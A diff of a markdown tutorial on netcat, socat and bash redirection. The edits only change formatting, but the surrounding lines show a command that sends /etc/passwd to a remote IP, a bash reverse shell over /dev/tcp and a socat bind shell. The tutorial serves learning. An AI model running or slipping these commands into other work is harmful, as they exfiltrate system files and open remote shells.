@@ -39,6 +39,7 @@ Now all you have to do is connect to this IP and enter the port and the file to 
 ```bash
 nc -v 192.168.0.10 1337 < xpto.txt
 ```
+
 #### Creating a honeypot
 
 If we want to simulate an open door on a machine to serve as a honeypot, we do the following.
@@ -109,7 +110,7 @@ $ socat tcp4-listen:<port> EXEC:/bin/bash
 $ cat /etc/passwd > /dev/tcp/10.10.10.5/1337
 ```
 
-If we want to send a bash, we do it as follows (the -i parameter means interactive). 
+If we want to send a bash, we do it as follows (the -i parameter means interactive).
 
 ```
 $ bash -i > /dev/tcp/10.10.10.5/1337 0>&1 2>&1
@@ -124,6 +125,8 @@ port open
 
 Remember that 0>&1 means that all stdin will be directed to stdout and 2>&1 means that all errors will be directed to stdout.
 
-STDIN - 0
-STDOUT - 1
+<figure><img src="../.gitbook/assets/utitilies.png" alt=""><figcaption></figcaption></figure>
+
+STDIN - 0\
+STDOUT - 1\
 STDERR - 2
